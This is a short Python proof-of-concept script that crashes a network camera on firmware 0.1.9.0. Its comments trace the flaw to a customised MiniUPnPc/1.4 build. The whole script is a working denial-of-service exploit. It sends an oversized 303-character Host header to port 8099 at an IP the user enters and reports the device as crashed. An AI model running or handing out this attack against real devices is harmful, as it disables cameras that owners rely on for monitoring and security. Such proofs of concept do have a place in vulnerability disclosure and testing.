import requests
# buffer > 302 = crash
# local dos poc
# firmware 0.1.9.0
# turns out to be a bug in a customized version of MiniUPnPc/1.4 see sctrl in the firmware progs bin folder.

buffer = 303 * "X"
headers = {
    "Host": buffer
}
host = input('Local IP of camera: ')
url = 'http://' + host + ':8099'
try:
    r = requests.get(url, headers=headers)
except requests.exceptions.ConnectionError as e:
    print('Host has been crashed.')
    print(e)
